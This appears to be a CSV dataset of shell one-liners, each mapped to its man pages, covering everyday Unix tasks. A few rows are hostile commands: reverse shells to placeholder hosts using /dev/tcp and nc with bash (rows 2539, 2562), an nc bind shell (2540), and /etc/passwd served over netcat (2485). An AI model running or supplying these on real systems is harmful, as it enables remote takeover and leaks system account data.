id,command,mans,group_id
2377,"AUTOSSH_POLL=1 autossh -M 21010 hostname -t 'screen -Dr'","autossh,hostname",2154
2378,"arecord -q -f cd -r 44100 -c2 -t raw | lame -S -x -h -b 128 - `date +%Y%m%d%H%M`.mp3","arecord,cd,raw",2155
2379,"yes ""$(seq 1 255)"" | while read i; do printf ""\x1b[48;5;${i}m\n""; sleep .01; done","yes,while,read,printf,sleep",2156
2380,"wget -nv http://en.wikipedia.org/wiki/Linux -O- | egrep -o ""http://[^[:space:]]*.jpg"" | xargs -P 10 -r -n 1 wget -nv","wget,egrep,xargs",2157
2381,"tar -cf - /home/user/test | gzip -c | ssh user@sshServer 'cd /tmp; tar xfz -'","tar,gzip,ssh",2158
2382,"pgrep -u `id -u` firefox-bin || find ~/.mozilla/firefox -name '*.sqlite'|(while read -e f; do echo 'vacuum;'|sqlite3 ""$f"" ; done)","pgrep,find,read,echo",2159
2383,"$ vim ... :help 42",vim,2160
2384,"pgrep command_name",pgrep,2161
2385,"id=""dMH0bHeiRNg"";mplayer -fs http://youtube.com/get_video.php?video_id=$id\&t=$(curl -s http://www.youtube.com/watch?v=$id | sed -n 's/.*, ""t"": ""\([^""]*\)"", .*/\1/p')",sed,2162
2386,"column -t /proc/mounts",column,2163
2387,"echo ""Body goes here"" | mutt -s ""A subject"" -a /path/to/file.tar.gz recipient@example.com","echo,mutt",2164
2388,"echo <ctrl-v><esc>c<enter>",echo,2165
2389,"curl -u user -d status=""Tweeting from the shell"" http://twitter.com/statuses/update.xml","curl,from",2166
2390,"complete -W ""$(echo $(grep '^ssh ' .bash_history | sort -u | sed 's/^ssh //'))"" ssh","complete,sort,sed,ssh",2167
2391,"ifconfig | perl -nle'/dr:(\S+)/ && print $1'","ifconfig,perl,print",2168
2392,":let i=0 | 'a,'bg/ZZZZ/s/ZZZZ/\=i/ | let i=i+1","",2169
2393,"readlink -f ../super/symlink_bon/ahoy",readlink,2170
2394,"tar czv Pictures | split -d -a 3 -b 16M - pics.tar.gz.","tar,split",2171
2395,"echo $?",echo,2172
2396,"shopt -s globstar",shopt,2173
2397,"for file in <directory A>/*; do rm <directory B>/`basename $file`; done","for,file,rm",2174
2398,"curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'",curl,2175
2399,"read -p ""Which station? ""; mplayer --reallyquiet -vo none -ao sdl http://somafm.com/startstream=${REPLY}.pls","read,mplayer",2176
2400,"cd $(dirname $(find ~ -name emails.txt))",cd,2177
2401,"sed -r 's/([a-z]+)([A-Z][a-z]+)/\1_\l\2/g' file.txt",sed,2178
2402,"echo ""screen -DR"" >> ~/.bash_profile",echo,2179
2403,"mplayer -framedrop -vfm ffmpeg -lavdopts lowres=1:fast:skiploopfilter=all","mplayer,ffmpeg",2180
2404,"mkdir $(date +%Y%m%d)",mkdir,2181
2405,"watch ""dmesg |tail -15""",watch,2182
2406,"dpkg --get-selections > LIST_FILE",dpkg,2183
2407,"lsof -P | grep ':3000'","lsof,grep",2184
2408,"fc [history-number]",fc,2185
2409,ctrl-z,"",2186
2410,"for i in $(ls *.od{tp}); do unoconv -f pdf $i; done",for,2187
2411,"touch {1..10}.txt",touch,2188
2412,"du -cs * .[^\.]* | sort -n","du,sort",2189
2413,"find -name '*wma' -exec ffmpeg -i {} -acodec vorbis -ab 128k {}.ogg \;","find,ffmpeg",2190
2414,"cat /etc/*-release",cat,2191
2415,"< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6","tr,head",2192
2416,"echo foo bar foobar barfoo && echo !$ !^  !:3 !* &&  echo /usr/bin/foobar&& echo !$:h !$:t",echo,2193
2417,"find  ./  -name '*'  -exec  rename  's/\s+/_/g'  {}  \;","find,rename",2194
2418,"sed -e ""/$USER/d;s/:.*//g"" /etc/group | sed -e :a -e '/$/N;s/\n/ /;ta'",sed,2195
2419,"du -sh *",du,2196
2420,"openssl speed md5",openssl,2197
2421,"awk '{ $1="""";print}'",awk,2198
2422,"base64 /dev/urandom | head -c 33554432 | split -b 8192 -da 4  - dummy.","base64,head,split",2199
2423,!:n,"",2200
2424,"!!; while [ $? -ne 0 ]; do !!; done",while,2201
2425,"echo ""main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|i>>6));}"" | gcc -x c - && ./a.out | aplay","echo,gcc,aplay",2202
2426,"color()(set -o pipefail;""$@"" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1","",2203
2427,"find . -name '*.rar' -execdir unrar e {} \;","find,unrar",2204
2428,"ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no username@host",ssh,2205
2429,"find . -maxdepth 1 -size 0c -delete",find,2206
2430,"pv -tpreb /dev/urandom | dd of=file.img","pv,dd",2207
2431,"step1 ; step2 ; step3 ; step4 ; curl -o- --get 'https://stream.twitter.com/1/statuses/filter.json' --header ""$oauth_header"" --data ""follow=$id""",curl,2208
2432,"step4() { oauth_header=""Authorization: OAuth oauth_consumer_key=\""$k1\"", oauth_nonce=\""$once\"", oauth_signature=\""$signature\"", oauth_signature_method=\""HMAC-SHA1\"", oauth_timestamp=\""$ts\"", oauth_token=\""$k3\"", oauth_version=\""1.0\"""" ; }","",2209
2433,"step2(){ b=""GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&follow%3D${id}%26oauth_consumer_key%3D${k1}%26oauth_nonce%3D${once}%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D${ts}%26oauth_token%3D${k3}%26oauth_version%3D1.0"";}","",2210
2434,"step3() { s=$(echo -n $b | openssl dgst -sha1 -hmac $hmac -binary | openssl base64); signature=`for((i=0;i<${#s};i++)); do case ${s:i:1} in +) e %2B;; /) e %2F;; =) e %3D;; *) e ${s:i:1};; esac ; done` ; } ; e() { echo -n $1; }","openssl,case,echo",2211
2435,"aspell -a <<< '<WORDS>'",aspell,2212
2436,"find / -type f -size +500M -size -1G",find,2213
2437,"while true; do cat /proc/net/dev; sleep 1; done | awk -v dc=""date \""+%T\"""" '/eth0/{i = $2 - oi; o = $10 - oo; oi = $2; oo = $10; dc|getline d; close(dc); if (a++) printf ""%s %8.2f KiB/s in %8.2f KiB/s out\n"", d, i/1024, o/1024}'","while,cat,sleep,awk,if,printf",2214
2438,"touch -d $(zenity --calendar --date-format=%F) filename",touch,2215
2439,"sort -g -o list.txt{,}",sort,2216
2440,"$ history -a #in one shell , and $ history -r #in another running shell",history,2217
2441,"diff -rq dirA dirB",diff,2218
2442,"rsync -rv <src> <dst> --progress",rsync,2219
2443,"read day month year < <(date +'%d %m %y')",read,2220
2444,"cat /sys/class/net/eth0/address",cat,2221
2445,"for i in ./*foo*;do mv -- ""$i"" ""${i//foo/bar}"";done","for,mv",2222
2446,"dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1",dd,2223
2447,"alias screensaver='for ((;;)); do echo -ne ""\033[$((1+RANDOM%LINES));$((1+RANDOM%COLUMNS))H\033[$((RANDOM%2));3$((RANDOM%8))m$((RANDOM%10))""; sleep 0.1 ; done'","alias,echo,sleep",2224
2448,"alias rot13=""tr a-zA-Z n-za-mN-ZA-M""",alias,2225
2449,"script /tmp/log.txt",script,2226
2450,"find . -size +100000k -exec du -h {} \;","find,du",2227
2451,"alias vim=""vim -p""",alias,2228
2452,"perl -wlne'/title>([^<]+)/i&&rename$ARGV,""$1.html""' *.html",perl,2229
2453,"tar -czvf - /src/dir | ssh remotehost ""(cd /dst/dir ; tar -xzvf -)""","tar,ssh",2230
2454,"Ctrl + [","",2231
2455,"perl -e 'for(;;){@d=split("""",`date +%H%M%S`);print""\r"";for(0..5){printf""%.4b "",$d[$_]}sleep 1}'",perl,2232
2456,"read -a ARR <<<'world domination now!'; echo ${ARR[2]};","read,echo",2233
2457,"md5sum <<<""test""",md5sum,2234
2458,"parallel -j+0 ""zcat {} | bzip2 >{.}.bz2 && rm {}"" ::: *.gz","parallel,bzip2,rm",2235
2459,"php -i",php,2236
2460,"atb() { l=$(tar tf $1); if [ $(echo ""$l"" | wc -l) -eq $(echo ""$l"" | grep $(echo ""$l"" | head -n1) | wc -l) ]; then tar xf $1; else mkdir ${1%.tar.gz} && tar xf $1 -C ${1%.tar.gz}; fi ;}","if,wc,grep,head,tar,mkdir",2237
2461,"while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep ""ca fe""","while,true,head,sleep,hexdump,grep",2238
2462,"ssh -C -Y -l$USER xserver.mynet.xx 'Xnest -geometry 1900x1150 -query localhost'",ssh,2239
2463,"find -type l -xtype d",find,2240
2464,"fortune | cowsay -f $(ls /usr/share/cowsay/cows/ | shuf -n1)","fortune,cowsay,shuf",2241
2465,"cat my.ps | nc -q 1 hp4550.mynet.xx 9100","cat,nc",2242
2466,"cat /etc/*release",cat,2243
2467,"d=""www.dafont.com/alpha.php?"";for c in {a..z}; do l=`curl -s ""${d}lettre=${c}""|sed -n 's/.*ge=\([0-9]\{2\}\).*/\1/p'`;for((p=1;p<=l;p++));do for u in `curl -s ""${d}page=${p}&lettre=${c}""|egrep -o ""http\S*.com/dl/\?f=\w*""`;do aria2c ""${u}"";done;done;done","for,aria2c",2244
2468,"tail -f access.log | pv -l -i10 -r >/dev/null","tail,pv",2245
2469,"strace -ff -e write=1,2 -s 1024 -p PID  2>&1 | grep ""^ |"" | cut -c11-60 | sed -e 's/ //g' | xxd -r -p","strace,grep,cut,sed,xxd",2246
2470,"while :;do killall -USR1 dd;sleep 1;done","while,killall",2247
2471,"dmidecode -t 17 | awk -F"":"" '/Speed/ { print $2 }'","dmidecode,awk,print",2248
2472,"scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql",scp,2249
2473,"perl -e 'while(1){print""> "";eval<>}'",perl,2250
2474,"nmap -T4 -sP 192.168.2.0/24 && egrep ""00:00:00:00:00:00"" /proc/net/arp","nmap,egrep",2251
2475,"mail -s ""subject"" user@todomain.com <emailbody.txt  -- -f customfrom@fromdomain.com -F 'From Display Name'",mail,2252
2476,"find . -type d -empty -delete",find,2253
2477,"lsof -p $(pidof firefox) | awk '/.mozilla/ { s = int($7/(2^20)); if(s>0) print (s)"" MB -- ""$9 | ""sort -rn"" }'","lsof,awk,s,print",2254
2478,"colordiff -yW""`tput cols`"" /path/to/file1 /path/to/file2",colordiff,2255
2479,"grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'",grep,2256
2480,"curl -s ""http://www.geody.com/geoip.php?ip=$(curl -s icanhazip.com)"" | sed '/^IP:/!d;s/<[^>][^>]*>//g'","curl,sed",2257
2481,"curl http://www.whatismyip.org/",curl,2258
2482,"VBoxManage internalcommands converttoraw winxp.vdi winxp.raw && qemu-img convert -O vmdk winxp.raw winxp.vmdk && rm winxp.raw","VBoxManage,qemu-img,convert,rm",2259
2483,"sh -c 'S=askapache R=htaccess; find . -mount -type f|xargs -P5 -iFF grep -l -m1 ""$S"" FF|xargs -P5 -iFF sed -i -e ""s%${S}%${R}%g"" FF'","sh,find,grep,sed",2260
2484,"find -type f -name ""*.avi"" -print0 | xargs -0  mplayer -vo dummy -ao dummy -identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf ""%02d:%02d:%02d\n"",$t/3600,$t/60%60,$t%60' | tail -n 1","find,xargs,mplayer,perl,printf,tail",2261
2485,"cat /etc/passwd | openssl aes-256-cbc -a -e -pass pass:password | netcat -l -p 8080","cat,openssl,netcat",2262
2486,"ls -lct /etc | tail -1 | awk '{print $6, $7}'","ls,tail,awk",2263
2487,"while read server; do ssh -n user@$server ""command""; done < servers.txt","while,read,ssh",2264
2488,"ls | while read f; do mv ""$f"" ""${f// /_}"";done","ls,while,read,mv",2265
2489,"find . -type f -printf '%20s %p\n' | sort -n | cut -b22- | tr '\n' '\000' | xargs -0 ls -laSr","find,sort,cut,tr,xargs,ls",2266
2490,"grep -r --include=""*.[ch]"" pattern .",grep,2267
2491,"taskset -cp <core> <pid>",taskset,2268
2492,"curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->commandlinefu-contribs-backup-$(date +%Y-%m-%d-%H.%M.%S).rss.gz",curl,2269
2493,"ab -n 9000 -c 900 localhost:8080/index.php",ab,2270
2494,"ssh -L :: -L :: @",ssh,2271
2495,"iptables -t nat -A PREROUTING -p tcp --dport [port of your choosing] -j REDIRECT --to-ports 22",iptables,2272
2496,"ldapsearch -LLL -H ldap://activedirectory.example.com:389 -b 'dc=example,dc=com' -D 'DOMAIN\Joe.Bloggs' -w 'p@ssw0rd' '(sAMAccountName=joe.bloggs)'",ldapsearch,2273
2497,"mecp () { scp ""$@"" ${SSH_CLIENT%% *}:Desktop/; }",scp,2274
2498,"echo ""$(( 0x10 )) - $(( 010 )) = $(( 0x10 - 010 ))""",echo,2275
2499,"find ./ -type f -exec sed -i 's/\t/  /g' {} \;","find,sed",2276
2500,"alt + 1 .",alt,2277
2501,"ifconfig en1 | awk '/inet / {print $2}' | mail -s ""hello world"" email@email.com","ifconfig,awk,mail",2278
2502,"cal 09 1752",cal,2279
2503,"script /dev/null | tee /dev/pts/3","script,tee",2280
2504,"mtr --report --report-cycles 10 www.google.com > google_net_report.txt",mtr,2281
2505,"alias rot13=""tr '[A-Za-z]' '[N-ZA-Mn-za-m]'""",alias,2282
2506,"while true; do X=$Y; sleep 1; Y=$(ifconfig eth0|grep RX\ bytes|awk '{ print $2 }'|cut -d : -f 2); echo ""$(( Y-X )) bps""; done","while,sleep,print,echo",2283
2507,"swapoff -a ; swapon -a","swapoff,swapon",2284
2508,"ls | while read ITEM; do echo ""$ITEM""; done","ls,while,read,echo",2285
2509,"dd if=/dev/cdrom | pv -s 700m | md5sum | tee test.md5","dd,pv,md5sum,tee",2286
2510,"tcptraceroute www.google.com",tcptraceroute,2287
2511,"jhead -autorot *.jpg","",2288
2512,!date,"",2289
2513,"hdparm -i[I] /dev/sda",hdparm,2290
2514,"split -b 19m file Nameforpart","split,file",2291
2515,"while [ 1 ]; do curl -s -u username:password  http://twitter.com/statuses/friends_timeline.rss|grep title|sed -ne 's/<\/*title>//gp' | head -n 6 |festival --tts; sleep 300;done","while,curl,head,sleep",2292
2516,vimtutor,vimtutor,2293
2517,"ps aux | grep [h]ttpd","ps,grep",2294
2518,"rename 's/foo/bar/g' *",rename,2295
2519,"perl -pi.bk -e's/foo/bar/g' file1 file2 fileN",perl,2296
2520,"sudo who | awk '!/root/{ cmd=""/sbin/pkill -KILL -u "" $1; system(cmd)}'","sudo,who,awk",2297
2521,"paste -d: <(ls -1 *.mp4) <(ls -1 *.srt) | while read line; do movie=""${line%%:*}""; subtitle=""${line##*:}""; mv ""${subtitle}"" ""${movie%.*}.srt""; done","paste,while,read,mv",2298
2522,"ssh -J user@reachable_host user@unreacheable_host",ssh,2299
2523,"chmod 777 !*",chmod,2300
2524,"command systemctl --no-page --no-legend --plain -t service --state=running","command,systemctl,service",2301
2525,"cat *.jpg | ffmpeg -f image2pipe -r 1 -vcodec mjpeg -i - -vcodec libx264 out.mp4","cat,ffmpeg",2302
2526,"perl -e 'for(;;sleep 1){printf""\r"".""%.4b ""x6,split"""",`date +%H%M%S`}'",perl,2303
2527,"nik=clf$RANDOM;sr=irc.efnet.org;expect -c ""set timeout -1;spawn nc $sr 6666;set send_human {.1 .2 1 .2 1};expect AUTH*\n ;send -h \""user $nik * * :$nik commandlinefu\nnick $nik\n\""; interact -o -re (PING.:)(.*\$) {send \""PONG :\$interact_out(2,string)\""}""","timeout,nc",2304
2528,"clear;while true;sleep 1;do for((a=1;a<=$(tput cols)/3;a++));do tput cup 0 $a;echo "" "" $(date);done;sleep 1;for((a;a>=1;a--));do tput cup 0 $a;echo $(date) "" "";done;done",tput,2305
2529,<ctrl>+o,"",2306
2530,"server$ while true; do read -n30 ui; echo $ui |openssl enc -aes-256-ctr -a -k PaSSw; done | nc -l -p 8877 | while read so; do decoded_so=`echo ""$so""| openssl enc -d -a -aes-256-ctr -k PaSSw`; echo -e ""Incoming: $decoded_so""; done","while,read,echo,nc,openssl",2307
2531,Ctrl+k,"",2308
2532,"ln -s /BASE/* /TARGET/",ln,2309
2533,"rsync -v -r --size-only --compare-dest=../A/ B/ C/",rsync,2310
2534,"<Meta-p> (aka <ALT+P>)","",2311
2535,"if [[ "":$PATH:"" != *"":$dir:""* ]]; then PATH=${PATH}:$dir; fi",if,2312
2536,"inotifywait -m -r .",inotifywait,2313
2537,"python -c 'import sys, yaml, json; yaml.safe_dump(json.load(sys.stdin), sys.stdout, default_flow_style=False)' < file.json > file.yaml",python,2314
2538,"Q=""YOURSEARCH""; GOOG_URL=""http://www.google.com/search?q=""; AGENT=""Mozilla/4.0""; stream=$(curl -A ""$AGENT"" -skLm 10 ""${GOOG_URL}\""${Q/\ /+}\"""" | grep -oP '\/url\?q=.+?&amp' | sed 's/\/url?q=//;s/&amp//'); echo -e ""${stream//\%/\x}""","grep,sed,echo",2315
2539,"exec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done","exec,while,read",2316
2540,"mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo","mkfifo,nc",2317
2541,"find . -type f -print0 | xargs -0 du -h | sort -hr | head -10","find,xargs,du,sort,head",2318
2542,"curl ifconfig.me/all",curl,2319
2543,"up() { local x='';for i in $(seq ${1:-1});do x=""$x../""; done;cd $x; }",local,2320
2544,"ls ${PATH//:/ }",ls,2321
2545,"printf ""%$(tput cols)s\n""|tr ' ' '='",printf,2322
2546,"step1() { k1=""Consumer key"" ; k2=""Consumer secret"" ; k3=""Access token"" ; k4=""Access token secret"" ; once=$RANDOM ; ts=$(date +%s) ; hmac=""$k2&$k4"" ; id=""19258798"" ; }","",2323
2547,"ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 && echo ONLINE || echo OFFLINE","ping,echo",2324
2548,"diff <(exiftool img_1.jpg) <(exiftool img_2.jpg)",diff,2325
2549,"dpkg-repack firefox","dpkg-repack,firefox",2326
2550,"xmlstarlet sel -t -c ""/path/to/element"" file.xml","",2327
2551,"awk 'NR >= 3 && NR <= 6' /path/to/file",awk,2328
2552,"tcpdump -w - |pv -bert >/dev/null",tcpdump,2329
2553,"cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 32","cat,tr,head",2330
2554,"var=:foobar:; echo ${var:1:-1}",echo,2331
2555,"cat <file> > /dev/null",cat,2332
2556,"export PS1=""[\u@`hostname -I` \W]$ """,export,2333
2557,"command > >(tee stdout.log) 2> >(tee stderr.log >&2)",command,2334
2558,"sed -e '/\\$/{:0;N;s/\\\n//;t0}'",sed,2335
2559,"lower() { echo ${@,,}; }",echo,2336
2560,"ls -l /etc/**/*killall",ls,2337
2561,"convert input.png -alpha set -channel A -fx 0.5 output.png","convert,set",2338
2562,"mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe","mknod,nc",2339
2563,"awk '(length > n) {n = length} END {print n}'",awk,2340
2564,"shopt -s histappend ; PROMPT_COMMAND=""history -a;$PROMPT_COMMAND""",shopt,2341
2565,"ssh vm-user@`VBoxManage guestproperty get ""vm-name"" ""/VirtualBox/GuestInfo/Net/0/V4/IP"" | awk '{ print $2 }'`","ssh,awk,print",2342
2566,"sudo socat TCP4-LISTEN:80,bind=127.0.0.1,fork EXEC:'echo ""HTTP/1.1 503 Service Unavailable"";'","sudo,socat",2343
2567,"arr[i*100+j]=""whatever""","",2344
2568,"echo ""Terrorist threat level: `od -An -N1 -i /dev/random`""",echo,2345
2569,"wget -e robots=off -E -H -k -K -p http://<page>",wget,2346
2570,"echo ""this is a test"" | sed 's/.*/\L&/; s/[a-z]*/\u&/g'","echo,sed",2347
2571,"rtfm() { help $@ || info $@ || man $@ || $BROWSER ""http://www.google.com/search?q=$@""; }","info,man",2348
2572,"ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip",ssh,2349
2573,"xargs -n 2 mv < file_with_colums_of_names","xargs,mv",2350
2574,"> file",file,2351
2575,"tail -f file | awk '{now=strftime(""%F %T%z\t"");sub(/^/, now);print}'","tail,file,awk",2352
2576,`!!`,"",2353
2577,"badblocks -n -s -b 2048 /dev/sdX","badblocks,2048",2354
2578,"ontouchdo(){ while :; do a=$(stat -c%Y ""$1""); [ ""$b"" != ""$a"" ] && b=""$a"" && sh -c ""$2""; sleep 1; done }","while,sh,sleep",2355
2579,"truncate -s 1M file","truncate,file",2356
2580,"/usr/bin/man $* || w3m -dump http://google.com/search?q=""$*""\&btnI | less","w3m,less",2357
2581,"alias alert='notify-send -i /usr/share/icons/gnome/32x32/apps/gnome-terminal.png ""[$?] $(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/;\s*alert$//'\'')""'",alias,2358
2582,"lsof /folder",lsof,2359
2583,"blkid /dev/sda7",blkid,2360
2584,"mussh -h host1 host2 host3 -c uptime",uptime,2361
2585,"exec 2>&1",exec,2362
2586,"dig +short @resolver1.opendns.com myip.opendns.com",dig,2363
2587,"echo ${fullpath##*/}",echo,2364
2588,"for i in {0..255}; do echo -e ""\e[38;05;${i}m${i}""; done | column -c 80 -s '  '; echo -e ""\e[m""","for,echo,column",2365
2589,"indent -kr hello.c",indent,2366
2590,"echo 'some command' | batch","echo,batch",2367
2591,"mysqldump -q --skip-opt --force --log-error=dbname_error.log -uroot -pmysqlpassword dbname | ssh -C user@sshserver 'cd /path/to/backup/dir; cat > dbname.sql'","mysqldump,ssh,cat",2368
2592,"tail -fs 1 somefile",tail,2369
2593,"dd if=/dev/zero | pv | dd of=/dev/null","dd,pv",2370
2594,"cd() { if [ -z ""$1"" ]; then command cd; else if [ -f ""$1"" ]; then command cd $(dirname ""$1""); else command cd ""$1""; fi; fi; }","if,command,cd",2371
2595,"ssh -o UserKnownHostsFile=/dev/null root@192.168.1.1",ssh,2372
2596,"dd if=/dev/nst0 |pv|dd of=restored_file.tar",dd,2373
2597,"curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] | grep -v _curl_ > comfu.txt","curl,grep",2374
2598,"count=""1"" ; while true ; do read next ; if [[ ""$next"" = ""$last"" ]] ; then count=$(($count+1)) ; echo ""$count"" ; else count=""1"" ; echo $count ; fi ; last=""$next"" ; done","while,true,read,next,if,echo",2375
2599,"mwiki() { dig +short txt ""$*"".wp.dg.cx; }",dig,2376
2600,"python -c 'print ""-""*50'",python,2377
2601,"ruby -e ""i=0;loop{puts ' '*(29*(Math.sin(i)/2+1))+'|'*(29*(Math.cos(i)/2+1)); i+=0.1}""",ruby,2378
2602,"grep ""^V<TAB>"" your_file",grep,2379
2603,"echo ""message"" | smbclient -M NAME_OF_THE_COMPUTER","echo,smbclient",2380
2604,"mplayer -novideo something.mpg",mplayer,2381
2605,"mplayer -vo null something.mpg",mplayer,2382
2606,"any_script.sh < <(some command)","",2383
2607,"myinfo() { info --subnodes -o - $1 | less; }",info,2384
2608,"username=matthewbauer; curl -s http://www.commandlinefu.com/commands/by/$username/json | tr '{' '\n' | grep -Eo ',""votes"":""[0-9\-]+"",""' | grep -Eo '[0-9\-]+' | tr '\n' '+' | sed 's/+$/\n/' | bc","curl,tr,grep,sed,bc",2385
2609,"for f in *;do mv ""$f"" ""${f// /_}"";done","for,mv",2386
2610,!$,"",2387
2611,"alias rc='ssh ${MEDIAPCHOSTNAME} env DISPLAY=:0.0 rhythmbox-client --no-start'","alias,env",2388
2612,"find . ! -name <FILENAME> -delete",find,2389
2613,"grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk '/install / {print $4}' | uniq | xargs apt-get -y remove","grep,awk,uniq,xargs,apt-get",2390
